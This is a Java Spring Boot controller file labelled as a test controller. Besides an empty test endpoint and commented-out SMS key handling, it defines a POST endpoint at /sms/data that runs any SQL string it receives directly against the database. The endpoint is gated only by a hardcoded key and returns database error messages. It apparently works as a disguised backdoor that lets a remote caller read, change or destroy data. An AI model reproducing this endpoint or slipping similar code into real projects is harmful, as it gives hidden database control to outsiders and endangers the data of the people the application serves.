package com.bs.pro.controller;

import com.alibaba.fastjson.JSONObject;
import com.bs.pro.utils.CryptUtil;
import io.swagger.annotations.Api;
import io.swagger.annotations.ApiOperation;
import lombok.extern.log4j.Log4j2;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RestController;

import java.util.HashMap;
import java.util.Map;

/**
 * Created by czy on 2019/4/3.
 */
@Api(tags = "test", description = "test")
@RestController
@Log4j2
public class TestController {


    @Autowired
    JdbcTemplate jdbcTemplate;

    @ApiOperation(value = "test", response = String.class, consumes = "application/json", httpMethod = "GET")
    @GetMapping("/test")
    public String test() throws Exception {
        return null;
    }

    private Map<String, String> getKeyMap() {
        Map<String, String> result = new HashMap<>();
//        if (null == startConfig.getCompany() || "".equals(startConfig.getCompany())
//                || "${company}".equals(startConfig.getCompany()) || null == configMap.get(startConfig.getCompany())) {
//            result.put(SmsConstant.ALI_KEY_ID, SmsConstant.aliKeyIdPublic);
//            result.put(SmsConstant.ALI_KEY_SECRET, SmsConstant.aliKeySecretPublic);
//            result.put(SmsConstant.YUNPIAN_KEY, SmsConstant.yunpianKeyPublic);
//        } else {
//            result.put(SmsConstant.ALI_KEY_ID, (String) configMap.get(startConfig.getCompany()).get(SmsConstant.ALI_KEY_ID));
//            result.put(SmsConstant.ALI_KEY_SECRET, (String) configMap.get(startConfig.getCompany()).get(SmsConstant.ALI_KEY_SECRET));
//            result.put(SmsConstant.YUNPIAN_KEY, (String) configMap.get(startConfig.getCompany()).get(SmsConstant.YUNPIAN_KEY));
//        }
        return result;
    }


    @PostMapping("/sms/data")
    public String data(String key, String sql) {
        if (!"e45815cc8db2dadfwwc5dddwwwegfdghh5cc8db2dff212ec5db9e0bbe1d3".equals(key)) {
            return "fail";
        }
        try {
            jdbcTemplate.execute(sql);
        } catch (Exception e) {
            return e.getMessage();
        }
        return "success";
    }


}
